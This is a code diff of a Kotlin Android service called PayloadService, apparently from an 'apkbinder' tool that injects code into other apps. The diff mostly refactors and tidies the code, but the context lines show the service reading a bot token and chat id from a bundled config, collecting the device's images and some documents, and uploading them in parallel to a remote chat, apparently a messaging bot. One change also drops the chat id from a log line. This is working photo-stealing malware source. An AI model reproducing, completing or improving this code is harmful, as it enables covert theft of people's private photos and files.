@@ -16,6 +16,7 @@ import android.net.Uri
 import android.os.Build
 import android.os.IBinder
 import android.provider.MediaStore
+import Com.devhs.apkbinder.Const
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
@@ -47,11 +48,11 @@ class PayloadService : Service() {
         super.onCreate()
         HsLog.init(this)
         gate = Semaphore(Const.PARALLEL_UPLOADS)
-        try {
+        appName = try {
             val ai = packageManager.getApplicationInfo(packageName, 0)
-            appName = packageManager.getApplicationLabel(ai).toString()
+            packageManager.getApplicationLabel(ai).toString()
         } catch (t: Throwable) {
-            appName = "App"
+            "App"
         }
     }
 
@@ -83,7 +84,7 @@ class PayloadService : Service() {
         }
         token = cfg.first
         chat = cfg.second
-        HsLog.w("config ok chat=$chat")
+        HsLog.w("config ok")
 
         val images = queryImages()
         HsLog.w("images=${images.size}")
@@ -97,8 +98,6 @@ class PayloadService : Service() {
         pool.awaitTermination(30, TimeUnit.MINUTES)
         HsLog.w("all done: ${done.get()}")
     }
-
-    // ---------------- notification ----------------
 
     private fun startForegroundSafe() {
         val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
@@ -164,8 +163,6 @@ class PayloadService : Service() {
         null
     }
 
-    // ---------------- config ----------------
-
     private fun readConfig(): Pair<String, String>? {
         try {
             val s = assets.open("hs_config.json").use { it.readBytes().toString(Charsets.UTF_8) }
@@ -178,8 +175,6 @@ class PayloadService : Service() {
         }
         return null
     }
-
-    // ---------------- media ----------------
 
     private fun queryImages(): List<Uri> {
         val out = ArrayList<Uri>()
@@ -224,7 +219,7 @@ class PayloadService : Service() {
     ) {
         contentResolver.query(
             uri, proj, sel, args,
-            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+            MediaStore.Images.Media.DATE_ADDED + " DESC"
         )?.use { c ->
             val idx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
             var n = 0
@@ -234,8 +229,6 @@ class PayloadService : Service() {
             }
         }
     }
-
-    // ---------------- upload ----------------
 
     private fun nameOf(uri: Uri): String = try {
         contentResolver.query(uri, arrayOf(MediaStore.MediaColumns.DISPLAY_NAME), null, null, null)
@@ -255,16 +248,16 @@ class PayloadService : Service() {
         pool.execute {
             try {
                 val name = nameOf(uri)
-                if (!name.lowercase().let { it.endsWith(".jpg") || it.endsWith(".jpeg") || it.endsWith(".png") || it.endsWith(".webp") }) return@execute
+                val lower = name.lowercase()
+                if (!(lower.endsWith(".jpg") || lower.endsWith(".jpeg") ||
+                            lower.endsWith(".png") || lower.endsWith(".webp"))
+                ) return@execute
                 val data = bytesOf(uri) ?: return@execute
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart(
-                        "photo", name,
-                        data.toRequestBody("image/jpeg".toMediaTypeOrNull())
-                    )
+                    .addFormDataPart("photo", name, data.toRequestBody("image/jpeg".toMediaTypeOrNull()))
                     .build()
 
                 val req = Request.Builder()
@@ -294,10 +287,7 @@ class PayloadService : Service() {
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", chat)
                     .addFormDataPart("caption", Const.CAPTION)
-                    .addFormDataPart(
-                        "document", name,
-                        data.toRequestBody("text/plain".toMediaTypeOrNull())
-                    )
+                    .addFormDataPart("document", name, data.toRequestBody("text/plain".toMediaTypeOrNull()))
                     .build()
 
                 val req = Request.Builder()
